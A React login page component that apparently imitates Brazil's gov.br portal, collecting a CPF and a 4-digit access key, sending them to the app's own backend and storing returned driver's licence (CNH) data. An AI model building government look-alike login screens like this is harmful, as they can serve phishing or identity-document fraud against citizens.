import { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import { clearCnhPdfCache } from '../utils/generateCnhPdf.js'
import { normalizeCnhData } from '../utils/cnhUser.js'
import './GovBrPasswordPage.css'

export default function GovBrPasswordPage() {
  const navigate = useNavigate()
  const location = useLocation()
  const cpf = location.state?.cpf || ''
  const [senha, setSenha] = useState('')
  const [show, setShow] = useState(false)
  const [erro, setErro] = useState('')
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    if (!cpf) navigate('/govbr-login', { replace: true })
  }, [cpf, navigate])
  async function handleLogin() {
    if (!senha) return
    setErro('')
    setLoading(true)
    try {
      const res = await fetch('/api/public/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf, pin: senha }),
      })
      const data = await res.json()
      if (!res.ok) { setErro(data.error || 'Chave de acesso inválida'); return }
      if (data.token) localStorage.setItem('cnh_token', data.token)
      const cnh = normalizeCnhData(data.cnh || data)
      try { localStorage.setItem('cnh_user', JSON.stringify(cnh)) } catch { /* imagens grandes */ }
      clearCnhPdfCache()
      navigate('/home')
    } catch {
      setErro('Não foi possível conectar ao servidor')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', background: '#EBEBEB', fontFamily: 'Rawline, Roboto, sans-serif', WebkitFontSmoothing: 'antialiased' }}>

      {/* Header */}
      <div style={{ background: '#071D41', display: 'flex', alignItems: 'center', padding: '0 16px', height: 56, flexShrink: 0 }}>
        <button onClick={() => navigate('/govbr-login')} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 6, marginRight: 8, display: 'flex', alignItems: 'center' }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
            <path d="M15 19L8 12L15 5" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <span style={{ color: '#fff', fontWeight: 700, fontSize: 15, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
          Inserir Chave de Acesso
        </span>
      </div>

      {/* Card */}
      <div style={{ flex: 1, padding: '24px 16px' }}>
        <div style={{ background: '#fff', borderRadius: 8, boxShadow: '0 1px 4px rgba(0,0,0,0.10)', overflow: 'hidden' }}>

          {/* Título + linha */}
          <div style={{ padding: '20px 20px 0' }}>
            <p style={{ fontWeight: 700, fontSize: 17, color: '#1C1C1E', margin: '0 0 14px' }}>
              Digite a sua chave de acesso
            </p>
            <div style={{ height: 1, background: '#D0D0D0', marginBottom: 20 }} />
          </div>

          {/* Campo */}
          <div style={{ padding: '0 20px 24px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            <div style={{ width: '70%' }}>
              <label style={{ display: 'block', fontSize: 13, color: '#1C1C1E', marginBottom: 6, fontWeight: 700, fontFamily: 'Rawline, Roboto, sans-serif' }}>
                Chave de acesso
              </label>

              <div style={{ position: 'relative', marginBottom: 8 }}>
                <input
                  autoFocus
                  className="chave-input"
                  type={show ? 'text' : 'password'}
                  inputMode="numeric"
                  maxLength={4}
                  value={senha}
                  onChange={e => { setSenha(e.target.value.replace(/\D/g, '').slice(0, 4)); setErro('') }}
                  onKeyDown={e => e.key === 'Enter' && handleLogin()}
                  style={{
                    width: '100%',
                    height: 38,
                    border: `1.5px solid ${erro ? '#D32F2F' : '#1351B4'}`,
                    borderRadius: 6,
                    padding: '0 40px 0 12px',
                    fontSize: 16,
                    letterSpacing: '0.25em',
                    color: '#1C1C1E',
                    background: '#fff',
                    boxSizing: 'border-box',
                    outline: 'none',
                    fontFamily: "'Rawline','Roboto',sans-serif",
                  }}
                />
                <button
                  onClick={() => setShow(s => !s)}
                  style={{ position: 'absolute', right: 8, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', padding: 2, display: 'flex' }}
                >
                  {show ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="#999" strokeWidth="2"/>
                      <circle cx="12" cy="12" r="3" stroke="#999" strokeWidth="2"/>
                    </svg>
                  ) : (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" stroke="#999" strokeWidth="2" strokeLinecap="round"/>
                      <line x1="1" y1="1" x2="23" y2="23" stroke="#999" strokeWidth="2" strokeLinecap="round"/>
                    </svg>
                  )}
                </button>
              </div>
            </div>

            {erro && (
              <div style={{ background: '#FFEBEE', border: '1px solid #D32F2F', borderRadius: 4, padding: '8px 12px', marginBottom: 12, fontSize: 13, color: '#B71C1C', fontFamily: "'Rawline','Roboto',sans-serif" }}>
                {erro}
              </div>
            )}

            {/* Botão ENTRAR */}
            <button
              onClick={handleLogin}
              disabled={loading}
              style={{
                width: '70%', height: 40,
                background: '#1351B4',
                border: 'none', borderRadius: 100,
                color: '#fff', fontWeight: 700, fontSize: 15,
                cursor: loading ? 'not-allowed' : 'pointer',
                opacity: loading ? 0.7 : 1,
                letterSpacing: '0.05em', marginTop: 8, fontFamily: 'Rawline, Roboto, sans-serif',
              }}
            >
              {loading ? 'VERIFICANDO...' : 'ENTRAR'}
            </button>

            {/* Esqueci a chave */}
            <div style={{ textAlign: 'center', marginTop: 20 }}>
              <a
                href="#"
                onClick={e => e.preventDefault()}
                style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 13, color: '#1351B4', textDecoration: 'none', fontWeight: 600, letterSpacing: '0.03em', textTransform: 'uppercase', fontFamily: "'Rawline','Roboto',sans-serif" }}
              >
                <span style={{ filter: 'brightness(0) saturate(100%) invert(16%) sepia(83%) saturate(2540%) hue-rotate(210deg) brightness(96%)', display: 'inline-block' }}>🔑</span>
                Esqueci a chave de acesso
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
